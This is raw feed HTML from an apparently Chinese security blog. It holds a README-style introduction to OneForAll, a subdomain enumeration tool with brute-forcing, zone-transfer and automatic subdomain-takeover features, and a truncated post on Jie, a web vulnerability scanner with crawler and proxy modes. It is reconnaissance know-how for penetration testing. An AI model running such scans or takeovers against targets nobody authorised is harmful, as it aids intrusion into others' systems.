-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, &quot;Noto Sans&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><summary style="box-sizing: border-box; display: list-item; cursor: pointer;"><b style="box-sizing: border-box; font-weight: var(--base-text-weight-semibold, 600);">🤔使用帮助</b></summary><p dir="auto" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px;">命令行参数只提供了一些常用参数，更多详细的参数配置请见<a href="https://github.com/shmilylty/OneForAll/tree/master/config/setting.py" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">setting.py</a>，如果你认为有些参数是命令界面经常使用到的或缺少了什么参数等问题非常欢迎反馈。由于众所周知的原因，如果要使用一些被墙的收集接口请先到<a href="https://github.com/shmilylty/OneForAll/tree/master/config/setting.py" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">setting.py</a>配置代理，有些收集模块需要提供API（大多都是可以注册账号免费获取），如果需要使用请到<a href="https://github.com/shmilylty/OneForAll/tree/master/config/api.py" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">api.py</a>配置API信息，如果不使用请忽略有关报错提示。（详细模块请阅读<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/collection_modules.md" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">收集模块说明</a>）</p><p dir="auto" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px;">OneForAll命令行界面基于<a href="https://github.com/google/python-fire/" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">Fire</a>实现，有关Fire更高级使用方法请参阅<a href="https://github.com/google/python-fire/blob/master/docs/using-cli.md" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">使用Fire CLI</a>。</p><p dir="auto" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px;"><a href="https://github.com/shmilylty/OneForAll/tree/master/oneforall.py" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">oneforall.py</a>是主程序入口，oneforall.py可以调用<a href="https://github.com/shmilylty/OneForAll/tree/master/brute.py" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">brute.py</a>，<a href="https://github.com/shmilylty/OneForAll/tree/master/takerover.py" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">takerover.py</a>及<a href="https://github.com/shmilylty/OneForAll/tree/master/dbexport.py" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">dbexport.py</a>等模块，为了方便进行子域爆破独立出了brute.py，为了方便进行子域接管风险检查独立出了takerover.py，为了方便数据库导出独立出了dbexport.py，这些模块都可以单独运行，并且所接受参数要更丰富一点，如果要单独使用这些模块请参考<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/usage_help.md" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">使用帮助</a></p><p dir="auto" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px;">❗注意：当你在使用过程中遇到一些问题或者疑惑时，请先到<a href="https://github.com/shmilylty/OneForAll/issues" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">Issues</a>里使用搜索找找答案，还可以参阅<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/troubleshooting.md" style="box-sizing: border-box; background-color: transparent; color: var(--fgColor-accent, var(--color-accent-fg)); text-decoration: underline; text-underline-offset: 0.2rem;">常见问题与回答</a>。</p><p dir="auto" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px;"><strong style="box-sizing: border-box; font-weight: var(--base-text-weight-semibold, 600);">oneforall.py使用帮助</strong></p><p dir="auto" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 16px;">以下帮助信息可能不是最新的，你可以使用<code style="box-sizing: border-box; font-family: ui-monospace, SFMono-Regular, &quot;SF Mono&quot;, Menlo, Consolas, &quot;Liberation Mono&quot;, monospace; font-size: 13.6px; padding: 0.2em 0.4em; margin: 0px; white-space: break-spaces; background-color: var(--bgColor-neutral-muted, var(--color-neutral-muted)); border-radius: 6px;">python oneforall.py --help</code>获取最新的帮助信息。</p><div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" style="box-sizing: border-box; position: relative !important; overflow: auto !important; margin-bottom: 16px; display: flex; justify-content: space-between; background-color: var(--bgColor-muted, var(--color-canvas-subtle));"><pre style="box-sizing: border-box; font-family: ui-monospace, SFMono-Regular, &quot;SF Mono&quot;, Menlo, Consolas, &quot;Liberation Mono&quot;, monospace; font-size: 13.6px; margin-top: 0px; margin-bottom: 0px; overflow-wrap: normal; padding: 16px; overflow: auto; line-height: 1.45; color: var(--fgColor-default, var(--color-fg-default)); background-color: var(--bgColor-muted, var(--color-canvas-subtle)); border-radius: 6px; word-break: normal; min-height: 52px;">python oneforall.py --help</pre><div class="zeroclipboard-container" style="box-sizing: border-box; display: block; animation: auto ease 0s 1 normal none running none;"><clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 tooltipped-no-delay d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="python oneforall.py --help" tabindex="0" role="button" style="box-sizing: border-box; position: relative; display: flex !important; padding: 0px !important; font-size: 14px; font-weight: var(--base-text-weight-medium, 500); line-height: 20px; white-space: nowrap; vertical-align: middle; cursor: pointer; user-select: none; border: 0px; border-radius: 6px; appearance: none; color: var(--fgColor-accent, var(--color-accent-fg)); background-color: transparent; box-shadow: none; transition: color 80ms cubic-bezier(0.33, 1, 0.68, 1) 0s, background-color, box-shadow, border-color; justify-content: center !important; align-items: center !important; margin: var(--base-size-8, 8px) !important; width: var(--control-small-size, 28px); height: var(--control-small-size, 28px);"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path></svg></clipboard-copy></div></div><div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" style="box-sizing: border-box; position: relative !important; overflow: auto !important; margin-bottom: 16px; display: flex; justify-content: space-between; background-color: var(--bgColor-muted, var(--color-canvas-subtle));"><pre style="box-sizing: border-box; font-family: ui-monospace, SFMono-Regular, &quot;SF Mono&quot;, Menlo, Consolas, &quot;Liberation Mono&quot;, monospace; font-size: 13.6px; margin-top: 0px; margin-bottom: 0px; overflow-wrap: normal; padding: 16px; overflow: auto; line-height: 1.45; color: var(--fgColor-default, var(--color-fg-default)); background-color: var(--bgColor-muted, var(--color-canvas-subtle)); border-radius: 6px; word-break: normal; min-height: 52px;">NAME    oneforall.py - OneForAll帮助信息<p>SYNOPSIS<br>    oneforall.py COMMAND <span class="pl-k" style="box-sizing: border-box; color: var(--color-prettylights-syntax-keyword);">|</span> –target=TARGET <span class="pl-k" style="box-sizing: border-box; color: var(--color-prettylights-syntax-keyword);">&lt;</span>flags<span class="pl-k" style="box-sizing: border-box; color: var(--color-prettylights-syntax-keyword);">&gt;</span></p><p>DESCRIPTION<br>    OneForAll是一款功能强大的子域收集工具</p><pre><code>Example:    python3 oneforall.py version    python3 oneforall.py --target example.com run    python3 oneforall.py --targets ./domains.txt run    python3 oneforall.py --target example.com --valid None run    python3 oneforall.py --target example.com --brute True run    python3 oneforall.py --target example.com --port small run    python3 oneforall.py --target example.com --fmt csv run    python3 oneforall.py --target example.com --dns False run    python3 oneforall.py --target example.com --req False run    python3 oneforall.py --target example.com --takeover False run    python3 oneforall.py --target example.com --show True runNote:    参数alive可选值True，False分别表示导出存活，全部子域结果    参数port可选值有&lt;span class="pl-s" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;&lt;span class="pl-pds" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;'&lt;/span&gt;default&lt;span class="pl-pds" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-s" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;&lt;span class="pl-pds" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;'&lt;/span&gt;small&lt;span class="pl-pds" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-s" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;&lt;span class="pl-pds" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;'&lt;/span&gt;large&lt;span class="pl-pds" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;'&lt;/span&gt;&lt;/span&gt;, 详见config.py配置    参数fmt可选格式有 &lt;span class="pl-s" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;&lt;span class="pl-pds" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;'&lt;/span&gt;csv&lt;span class="pl-pds" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;'&lt;/span&gt;&lt;/span&gt;,&lt;span class="pl-s" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;&lt;span class="pl-pds" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;'&lt;/span&gt;json&lt;span class="pl-pds" style="box-sizing: border-box; color: var(--color-prettylights-syntax-string);"&gt;'&lt;/span&gt;&lt;/span&gt;    参数path默认None使用OneForAll结果目录生成路径</code></pre><p>ARGUMENTS<br>    TARGET<br>        单个域名(二选一必需参数)<br>    TARGETS<br>        每行一个域名的文件路径(二选一必需参数)</p><p>FLAGS<br>    –brute=BRUTE<br>        s<br>    –dns=DNS<br>        DNS解析子域(默认True)<br>    –req=REQ<br>        HTTP请求子域(默认True)<br>    –port=PORT<br>        请求验证子域的端口范围(默认只探测80端口)<br>    –valid=VALID<br>        只导出存活的子域结果(默认False)<br>    –fmt=FMT<br>        结果保存格式(默认csv)<br>    –path=PATH<br>        结果保存路径(默认None)<br>    –takeover=TAKEOVER<br>        检查子域接管(默认False)</p></pre><div class="zeroclipboard-container" style="box-sizing: border-box; display: block; animation: auto ease 0s 1 normal none running none;">&lt;clipboard-copy aria-label=”Copy” class=”ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 tooltipped-no-delay d-flex flex-justify-center flex-items-center” data-copy-feedback=”Copied!” data-tooltip-direction=”w” value=”NAME<br>    oneforall.py - OneForAll帮助信息<p></p><p>SYNOPSIS<br>    oneforall.py COMMAND | –target=TARGET <flags></flags></p><p>DESCRIPTION<br>    OneForAll是一款功能强大的子域收集工具</p><pre><code>Example:    python3 oneforall.py version    python3 oneforall.py --target example.com run    python3 oneforall.py --targets ./domains.txt run    python3 oneforall.py --target example.com --valid None run    python3 oneforall.py --target example.com --brute True run    python3 oneforall.py --target example.com --port small run    python3 oneforall.py --target example.com --fmt csv run    python3 oneforall.py --target example.com --dns False run    python3 oneforall.py --target example.com --req False run    python3 oneforall.py --target example.com --takeover False run    python3 oneforall.py --target example.com --show True runNote:    参数alive可选值True，False分别表示导出存活，全部子域结果    参数port可选值有'default', 'small', 'large', 详见config.py配置    参数fmt可选格式有 'csv','json'    参数path默认None使用OneForAll结果目录生成路径</code></pre><p>ARGUMENTS<br>    TARGET<br>        单个域名(二选一必需参数)<br>    TARGETS<br>        每行一个域名的文件路径(二选一必需参数)</p><p>FLAGS<br>    –brute=BRUTE<br>        s<br>    –dns=DNS<br>        DNS解析子域(默认True)<br>    –req=REQ<br>        HTTP请求子域(默认True)<br>    –port=PORT<br>        请求验证子域的端口范围(默认只探测80端口)<br>    –valid=VALID<br>        只导出存活的子域结果(默认False)<br>    –fmt=FMT<br>        结果保存格式(默认csv)<br>    –path=PATH<br>        结果保存路径(默认None)<br>    –takeover=TAKEOVER<br>        检查子域接管(默认False)” tabindex=”0” role=”button” style=”box-sizing: border-box; position: relative; display: flex !important; padding: 0px !important; font-size: 14px; font-weight: var(–base-text-weight-medium, 500); line-height: 20px; white-space: nowrap; vertical-align: middle; cursor: pointer; user-select: none; border: 0px; border-radius: 6px; appearance: none; color: var(–fgColor-accent, var(–color-accent-fg)); background-color: transparent; box-shadow: none; transition: color 80ms cubic-bezier(0.33, 1, 0.68, 1) 0s, background-color, box-shadow, border-color; justify-content: center !important; align-items: center !important; margin: var(–base-size-8, 8px) !important; width: var(–control-small-size, 28px); height: var(–control-small-size, 28px);”&gt;<svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path></svg></p></div></div></details><p></p><h2 id="🎉项目简介"><a href="#🎉项目简介" class="headerlink" title="🎉项目简介"></a>🎉项目简介</h2><p>项目地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><p>在渗透测试中信息收集的重要性不言而喻，子域收集是信息收集中必不可少且非常重要的一环，目前网上也开源了许多子域收集的工具，但是总是存在以下部分问题：</p><ul><li><strong>不够强大</strong>，子域收集的接口不够多，不能做到对批量子域自动收集，没有自动子域解析，验证，FUZZ以及信息拓展等功能。</li><li><strong>不够友好</strong>，固然命令行模块比较方便，但是当可选的参数很多，要实现的操作复杂，用命令行模式就有点不够友好，如果有交互良好，高可操作的前端那么使用体验就会好很多。</li><li><strong>缺少维护</strong>，很多工具几年没有更新过一次，issues和PR是啥，不存在的。</li><li><strong>效率问题</strong>，没有利用多进程，多线程以及异步协程技术，速度较慢。</li></ul><p>为了解决以上痛点，此项目应用而生，正如其名，我希望OneForAll是一款集百家之长，功能强大的全面快速子域收集终极神器🔨。</p><p>目前OneForAll还在开发中，肯定有不少问题和需要改进的地方，欢迎大佬们提交<a href="https://github.com/shmilylty/OneForAll/issues">Issues</a>和<a href="https://github.com/shmilylty/OneForAll/pulls">PR</a>，用着还行给个小星星✨吧，目前有一个专门用于OneForAll交流和反馈QQ群👨‍👨‍👦‍👦：:<a href="https://shang.qq.com/wpa/qunwpa?idkey=125d3689b60445cdbb11e4ddff38036b7f6f2abbf4f7957df5dddba81aa90771"><strong>824414244</strong></a>（加群验证：信息收集）。</p><h2 id="👍功能特性"><a href="#👍功能特性" class="headerlink" title="👍功能特性"></a>👍功能特性</h2><ul><li><p>收集能力强大</p><p>，详细模块请阅读</p><p>收集模块说明</p><p>。</p><ol><li>利用证书透明度收集子域（目前有6个模块：<code>censys_api</code>，<code>certspotter</code>，<code>crtsh</code>，<code>entrust</code>，<code>google</code>，<code>spyse_api</code>）</li><li>常规检查收集子域（目前有4个模块：域传送漏洞利用<code>axfr</code>，检查跨域策略文件<code>cdx</code>，检查HTTPS证书<code>cert</code>，检查内容安全策略<code>csp</code>，检查robots文件<code>robots</code>，检查sitemap文件<code>sitemap</code>，利用NSEC记录遍历DNS域<code>dnssec</code>，后续会添加NSEC3记录等模块）</li><li>利用网上爬虫档案收集子域（目前有2个模块：<code>archivecrawl</code>，<code>commoncrawl</code>，此模块还在调试，该模块还有待添加和完善）</li><li>利用DNS数据集收集子域（目前有24个模块：<code>bevigil_api</code>, <code>binaryedge_api</code>, <code>bufferover</code>, <code>cebaidu</code>, <code>chinaz</code>, <code>chinaz_api</code>, <code>circl_api</code>, <code>cloudflare</code>, <code>dnsdb_api</code>, <code>dnsdumpster</code>, <code>hackertarget</code>, <code>ip138</code>, <code>ipv4info_api</code>, <code>netcraft</code>, <code>passivedns_api</code>, <code>ptrarchive</code>, <code>qianxun</code>, <code>rapiddns</code>, <code>riddler</code>, <code>robtex</code>, <code>securitytrails_api</code>, <code>sitedossier</code>, <code>threatcrowd</code>, <code>wzpc</code>, <code>ximcx</code>）</li><li>利用DNS查询收集子域（目前有5个模块：通过枚举常见的SRV记录并做查询来收集子域<code>srv</code>，以及通过查询域名的DNS记录中的MX,NS,SOA,TXT记录来收集子域）</li><li>利用威胁情报平台数据收集子域（目前有6个模块：<code>alienvault</code>, <code>riskiq_api</code>，<code>threatbook_api</code>，<code>threatminer</code>，<code>virustotal</code>，<code>virustotal_api</code>该模块还有待添加和完善）</li><li>利用搜索引擎发现子域（目前有18个模块：<code>ask</code>, <code>baidu</code>, <code>bing</code>, <code>bing_api</code>, <code>duckduckgo</code>, <code>exalead</code>, <code>fofa_api</code>, <code>gitee</code>, <code>github</code>, <code>github_api</code>, <code>google</code>, <code>google_api</code>, <code>shodan_api</code>, <code>so</code>, <code>sogou</code>, <code>yahoo</code>, <code>yandex</code>, <code>zoomeye_api</code>），在搜索模块中除特殊搜索引擎，通用的搜索引擎都支持自动排除搜索，全量搜索，递归搜索。</li></ol></li><li><p><strong>支持子域爆破</strong>，该模块有常规的字典爆破，也有自定义的fuzz模式，支持批量爆破和递归爆破，自动判断泛解析并处理。</p></li><li><p><strong>支持子域验证</strong>，默认开启子域验证，自动解析子域DNS，自动请求子域获取title和banner，并综合判断子域存活情况。</p></li><li><p><strong>支持子域爬取</strong>，根据已有的子域，请求子域响应体以及响应体里的JS，从中再次发现新的子域。</p></li><li><p><strong>支持子域置换</strong>，根据已有的子域，使用子域替换技术再次发现新的子域。</p></li><li><p><strong>支持子域接管</strong>，默认开启子域接管风险检查，支持子域自动接管（目前只有Github，有待完善），支持批量检查。</p></li><li><p><strong>处理功能强大</strong>，发现的子域结果支持自动去除，自动DNS解析，HTTP请求探测，自动筛选出有效子域，拓展子域的Banner信息，最终支持的导出格式有<code>txt</code>, <code>csv</code>, <code>json</code>。</p></li><li><p><strong>速度极快</strong>，<a href="https://github.com/shmilylty/OneForAll/tree/master/collect.py">收集模块</a>使用多线程调用，<a href="https://github.com/shmilylty/OneForAll/tree/master/brute.py">爆破模块</a>使用<a href="https://github.com/blechschmidt/massdns">massdns</a>，DNS解析速度每秒可解析350000以上个域名，子域验证中DNS解析和HTTP请求使用异步多协程，多线程检查<a href="https://github.com/shmilylty/OneForAll/tree/master/takeover.py">子域接管</a>风险。</p></li><li><p><strong>体验良好</strong>，各模块都有进度条，异步保存各模块结果。</p></li></ul><p>如果你有其他很棒的想法请务必告诉我！😎</p><h2 id="🌲目录结构"><a href="#🌲目录结构" class="headerlink" title="🌲目录结构"></a>🌲目录结构</h2><p>更多信息请参阅<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/directory_structure.md">目录结构说明</a>。</p><p>本项目<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/">docs</a>目录下还提供了一些帮助与说明，如<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/dictionary_source.md">子域字典来源说明</a>、<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/wildcard_judgment.png">泛解析判断流程</a>。</p><h2 id="👏用到框架"><a href="#👏用到框架" class="headerlink" title="👏用到框架"></a>👏用到框架</h2><ul><li><a href="https://github.com/aio-libs/aiohttp">aiohttp</a> - 异步http客户端/服务器框架</li><li><a href="https://pypi.org/project/beautifulsoup4/">beautifulsoup4</a> - 可以轻松从HTML或XML文件中提取数据的Python库</li><li><a href="https://github.com/google/python-fire">fire</a> - Python Fire是一个纯粹根据任何Python对象自动生成命令行界面（CLI）的库</li><li><a href="https://github.com/Delgan/loguru">loguru</a> - 旨在带来愉快的日志记录Python库</li><li><a href="https://github.com/blechschmidt/massdns">massdns</a> - 高性能的DNS解析器</li><li><a href="https://github.com/kennethreitz/records">records</a> - Records是一个非常简单但功能强大的库，用于对大多数关系数据库进行最原始SQL查询。</li><li><a href="https://github.com/psf/requests">requests</a> - Requests 唯一的一个非转基因的 Python HTTP 库，人类可以安全享用。</li><li><a href="https://github.com/tqdm/tqdm">tqdm</a> - 适用于Python和CLI的快速，可扩展的进度条库</li></ul><p>感谢这些伟大优秀的Python库！</p><h2 id="🔖版本控制"><a href="#🔖版本控制" class="headerlink" title="🔖版本控制"></a>🔖版本控制</h2><p>该项目使用<a href="https://semver.org/">SemVer</a>语言化版本格式进行版本管理，你可以参阅<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/changes.md">变更记录说明</a>了解历史变更情况。</p><h2 id="⌛后续计划"><a href="#⌛后续计划" class="headerlink" title="⌛后续计划"></a>⌛后续计划</h2><ul><li>各模块持续优化和完善</li><li>操作强大交互人性的前端界面实现</li></ul><p>更多信息请参阅<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/todo.md">后续开发计划</a>。</p><h2 id="🙏贡献"><a href="#🙏贡献" class="headerlink" title="🙏贡献"></a>🙏贡献</h2><p>非常热烈欢迎各位大佬一起完善本项目！</p><h2 id="👨‍💻贡献者"><a href="#👨‍💻贡献者" class="headerlink" title="👨‍💻贡献者"></a>👨‍💻贡献者</h2><ul><li><a href="https://github.com/shmilylty">Jing Ling</a><ul><li>核心开发</li></ul></li></ul><p>你可以在<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/contributors.md">贡献者文档</a>中查看所有贡献者以及他们所做出的贡献，感谢他们让OneForAll变得更强大好用。</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jie-一款能够平替xray的工具!而且还开源</title>
      <link href="/2024/03/03/19-Jie-%E6%AF%94%E8%83%BD%E5%A4%9F%E5%B9%B3%E6%9B%BFxray%E7%9A%84%E4%B8%80%E6%AC%BE%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/03/03/19-Jie-%E6%AF%94%E8%83%BD%E5%A4%9F%E5%B9%B3%E6%9B%BFxray%E7%9A%84%E4%B8%80%E6%AC%BE%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="Jie-一款能够平替xray的工具"><a href="#Jie-一款能够平替xray的工具" class="headerlink" title="Jie-一款能够平替xray的工具!"></a>Jie-一款能够平替xray的工具!</h1><h2 id="Github链接"><a href="#Github链接" class="headerlink" title="Github链接"></a>Github链接</h2><p><a href="https://github.com/yhy0/Jie">https://github.com/yhy0/Jie</a></p><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接:"></a>下载链接:</h2><p><a href="https://github.com/yhy0/Jie/releases/tag/v1.0.4">https://github.com/yhy0/Jie/releases/tag/v1.0.4</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过<a href="https://github.com/Qianlitp/crawlergo">主动爬虫模式</a>或<a href="https://github.com/lqqyt2423/go-mitmproxy">被动代理</a>获取流量，对流量进行分析、扫描。</p><p><strong>使用前请详细阅读文档</strong></p><h2 id="主动模式"><a href="#主动模式" class="headerlink" title="主动模式"></a>主动模式</h2><p>使用 <a href="https://github.com/Qianlitp/crawlergo">crawlergo</a> 爬虫实现 主动模式下可以通过指定 <code>--copilot</code> 来进入 <strong>Security Copilot</strong> 模式，扫描完不退出，方便查看 web 结果页面</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Jie web -t https://public-firing-range.appspot.com/ -p xss -o vulnerability_report.html --copilot</span><br></pre></td></tr></tbody></table></figure><p>不指定 web 的用户名密码，会自动生成一个<code>yhy/密码</code>，可以在日志中查看,比如下面就是自动生成的</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO [cmd:webscan.go(glob):55] Security Copilot web report authorized:yhy/3TxSZw8t8w</span><br></pre></td></tr></tbody></table></figure><h2 id="被动模式-Security-Copilot"><a href="#被动模式-Security-Copilot" class="headerlink" title="被动模式(Security Copilot)"></a>被动模式(Security Copilot)</h2><p>被动代理 通过 <a href="https://github.com/lqqyt2423/go-mitmproxy/">go-mitmproxy</a> 实现。</p><h3 id="Security-Copilot"><a href="#Security-Copilot" class="headerlink" title="Security Copilot"></a>Security Copilot</h3><p>为什么称之为 <code>Security Copilot</code>,按照我的构想，这不仅仅是一个漏洞扫描器，还是一个集大成的辅助工具。</p><p>挂上扫描器后，过一遍网站，即使没有漏洞，也要告诉我这个网站的大致信息(指纹、cdn、端口信息、敏感信息、API 路径、子域名等等)，这样帮助人工进行进一步的梳理，辅助挖洞，而不是扫描完毕没洞就是完事了，还要人工重新过一遍。</p><h3 id="证书下载"><a href="#证书下载" class="headerlink" title="证书下载"></a>证书下载</h3><p>被动代理下HTTPS 网站需要安装证书，HTTPS 证书相关逻辑与 <a href="https://mitmproxy.org/">mitmproxy</a> 兼容，并保存在 ~/.mitmproxy 文件夹中。</p><p>安装信任根证书, 安装步骤可参考 Python mitmproxy 文档：<a href="https://docs.mitmproxy.org/stable/concepts-certificates/">About Certificates</a>。</p><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Jie  web --listen :9081 --web 9088 --user yhy --pwd 123 --debug</span><br></pre></td></tr></tbody></table></figure><p>这样会监听 9081 端口，web 界面(SecurityCopilot)开放会在 9088 端口</p><p>浏览器指定代理 9081，或者联动 burp</p><p><a href="https://github.com/yhy0/Jie/blob/main/images/image-20240101121809597.png"><img src="https://github.com/yhy0/Jie/raw/main/images/image-20240101121809597.png" alt="image-20240101121809597"></a></p><p><a href="https://github.com/yhy0/Jie/blob/main/images/image-20240101121931631.png"><img src="https://github.com/yhy0/Jie/raw/main/images/image-20240101121931631.png" alt="image-20240101121931631"></a></p><p><a href="https://github.com/yhy0/Jie/blob/main/images/image-20240101121957058.png"><img src="https://github.com/yhy0/Jie/raw/main/images/image-20240101121957058.png" alt="image-20240101121957058"></a></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>一些配置可以通过 <a href="https://github.com/yhy0/Jie/blob/main/Jie_config.yaml">Jie_config.yaml</a>修改，也可以通过<code>http://127.0.0.1:9088/</code>的配置界面修改（web 界面修改后会实时更新到配置文件中）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">./Jie web -h</span><br><span class="line">Flags:</span><br><span class="line">      --copilot          Blocking program, go to the default port 9088 to view detailed scan information.</span><br><span class="line">                         主动模式下，可以通过指定该参数阻塞程序，扫描完不退出程序，可以到 web 端口查看信息。</span><br><span class="line">  -h, --help             help for web</span><br><span class="line">      --listen string    use proxy resource collector, value is proxy addr, (example: 127.0.0.1:9080).</span><br><span class="line">                         被动模式监听的代理地址，默认 